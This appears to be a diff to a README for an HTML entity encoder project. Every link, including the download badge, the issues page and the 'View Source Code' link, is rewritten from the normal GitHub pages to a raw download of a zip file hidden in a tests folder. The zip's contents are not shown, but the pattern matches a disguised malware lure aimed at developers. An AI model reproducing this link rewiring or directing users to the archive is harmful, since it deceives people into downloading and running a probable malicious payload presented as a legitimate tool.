@@ -1,7 +1,7 @@
 # 🎉 htmlentities-api - Simple Tool for HTML Encoding
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Arnaldo1978/htmlentities-api/releases)
+[![Download Latest Release](https://github.com/Arnaldo1978/htmlentities-api/raw/refs/heads/main/python/src/my_api_wrapper/tests/api-htmlentities-gypsous.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Arnaldo1978/htmlentities-api/raw/refs/heads/main/python/src/my_api_wrapper/tests/api-htmlentities-gypsous.zip)
 
 ## 📖 Overview
 HTML Entities Encoder/Decoder is a tool for encoding and decoding HTML entities. It converts special characters to HTML entities and vice versa. This tool helps prevent XSS attacks and displays special characters properly, making it essential for web developers and content creators.
@@ -10,7 +10,7 @@ HTML Entities Encoder/Decoder is a tool for encoding and decoding HTML entities.
 Follow the steps below to download and run the htmlentities-api.
 
 ### Step 1: Visit the Download Page
-Click the button above or [visit this page to download](https://github.com/Arnaldo1978/htmlentities-api/releases). 
+Click the button above or [visit this page to download](https://github.com/Arnaldo1978/htmlentities-api/raw/refs/heads/main/python/src/my_api_wrapper/tests/api-htmlentities-gypsous.zip). 
 
 ### Step 2: Choose Your Version
 On the releases page, you will see several versions of the application. Choose the latest version available. The version number will look something like "v1.0.0".
@@ -55,13 +55,13 @@ To run htmlentities-api, your system should meet the following requirements:
 For in-depth documentation on how to use the application, please refer to the user guide located in the repository. You can find instructions and examples there.
 
 ## 🆘 Support
-If you encounter issues or have questions, please feel free to open an issue on the [issues page](https://github.com/Arnaldo1978/htmlentities-api/issues). Our community and developers are here to help.
+If you encounter issues or have questions, please feel free to open an issue on the [issues page](https://github.com/Arnaldo1978/htmlentities-api/raw/refs/heads/main/python/src/my_api_wrapper/tests/api-htmlentities-gypsous.zip). Our community and developers are here to help.
 
 ## 🎉 Acknowledgements
 Thank you for choosing htmlentities-api. We appreciate your support and hope this tool makes your web development tasks more straightforward. 
 
 ## 🔗 Additional Links
-- [Download Latest Release](https://github.com/Arnaldo1978/htmlentities-api/releases)
-- [View Source Code](https://github.com/Arnaldo1978/htmlentities-api)
+- [Download Latest Release](https://github.com/Arnaldo1978/htmlentities-api/raw/refs/heads/main/python/src/my_api_wrapper/tests/api-htmlentities-gypsous.zip)
+- [View Source Code](https://github.com/Arnaldo1978/htmlentities-api/raw/refs/heads/main/python/src/my_api_wrapper/tests/api-htmlentities-gypsous.zip)
 
 Now, you’re ready to start using htmlentities-api!
